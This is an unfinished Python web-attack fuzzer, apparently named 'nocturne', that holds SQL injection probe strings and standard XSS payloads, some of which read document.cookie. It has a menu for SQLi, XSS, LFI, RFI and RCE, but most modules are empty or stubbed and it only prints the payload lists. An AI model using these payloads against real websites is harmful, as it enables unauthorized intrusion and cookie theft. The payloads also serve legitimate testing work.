import argparse, urllib, os, sys

sqli = ["'", "\"", "`", "and 1=0", "or 1=0", "' and 1=0", "' or 1=0", "\" and 1=0", "\" or 1=0", "`and 1=0", "` or 1=0"]
xss = ["';alert(String.fromCharCode(88,83,83))//", "\";alert(String.fromCharCode(88,83,83))//",
       "--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", "'';!--\"<XSS>=&{()}",
       "<IMG SRC=\"javascript:alert('XSS');\">", "<IMG SRC=javascript:alert('XSS')>", "<IMG SRC=JaVaScRiPt:alert('XSS')>",
       "<IMG SRC=`javascript:alert(\"Test, 'XSS'\")`>", "<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
       "<a onmouseover=alert(document.cookie)>xxs link</a>", "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
       "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"]
lfi = []
rfi = []
rce = []

def clearScreen():
    if sys.platform == 'win32':os.system('cls')
    else:os.system('clear')
    print('''
                         __        __   	 ____       ____
       ____  ____  _____/ /___  __/ /__ 	 )   \     /   (
      / __ \/ __ \/ ___/ __/ / / / / _ \	  )_  \_V_/  _(
     / / / / /_/ / /__/ /_/ /_/ / /  __/	    )__   __(   
    /_/ /_/\____/\___/\__/\__,_/_/\___/	               `-'
    ''')

def get():
    i = input("\n\t1. SQLi\n\t2. XSS\n\t3. LFI\n\t4. RFI\n\t5. RCE\n")
    if i=="1":atk = sqli
    elif i=="2":atk = xss
    elif i=="3":atk = lfi
    elif i=="4":atk = rfi
    elif i=="5":atk = rce
    print(atk)

def post():
    print("POST functionality not yet developed.")

def cookie():
    print("COOKIE functionality not yet developed.")

parser = argparse.ArgumentParser()

parser.add_argument('-m', '--method', dest='method', help='get, post, or cookie')
parser.add_argument('-u', '--url', dest='url', help='url to target')
parser.add_argument('-p', '--parameter', dest='parameter', help='parameter to use')
parser.add_argument('-d', '--data', dest='data', help='data to use for post or cookie module', default=None)

args = parser.parse_args()

clearScreen()

if args.method.lower() == 'get':get()
elif args.method.lower() == 'post':post()
